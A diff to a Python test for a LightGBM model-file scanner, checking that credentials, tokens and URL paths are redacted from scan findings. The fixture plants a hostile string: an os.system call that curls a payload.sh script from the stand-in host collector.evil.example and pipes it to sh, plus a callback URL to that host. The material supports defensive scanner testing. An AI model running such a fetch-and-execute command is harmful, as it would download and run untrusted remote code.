@@ -275,9 +275,11 @@ def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
                 (
                     "api_key=LGB_ADJACENT_SECRET Authorization: Bearer LGB_BEARER_SECRET "
                     "metadata=os.system('curl LGB_STANDALONE_SECRET "
-                    "https://lgb_user:lgb_pass@collector.evil.example/payload.sh?token=LGB_SECRET#frag | sh') "
+                    "https://lgb_user:lgb_pass@collector.evil.example/"
+                    "LGB_PATH_SECRET/payload.sh?token=LGB_SECRET#frag | sh') "
                 ),
-                "callback_url=https://lgb_user:lgb_pass@collector.evil.example/payload.sh?token=LGB_SECRET#frag",
+                "callback_url=https://lgb_user:lgb_pass@collector.evil.example/"
+                "LGB_PATH_SECRET/payload.sh?token=LGB_SECRET#frag",
             ]
         ),
         encoding="utf-8",
@@ -286,14 +288,16 @@ def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
     result = LightGBMScanner().scan(str(path))
 
     failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
-    assert "https://collector.evil.example/payload.sh" in failed_details
+    assert "https://collector.evil.example" in failed_details
     assert "lgb_user" not in failed_details
     assert "lgb_pass" not in failed_details
     assert "LGB_SECRET" not in failed_details
+    assert "LGB_PATH_SECRET" not in failed_details
     assert "LGB_ADJACENT_SECRET" not in failed_details
     assert "LGB_BEARER_SECRET" not in failed_details
     assert "LGB_STANDALONE_SECRET" not in failed_details
     assert "model_text_may_contain_sensitive_literals" in failed_details
+    assert "payload.sh" not in failed_details
     assert "#frag" not in failed_details
 
 
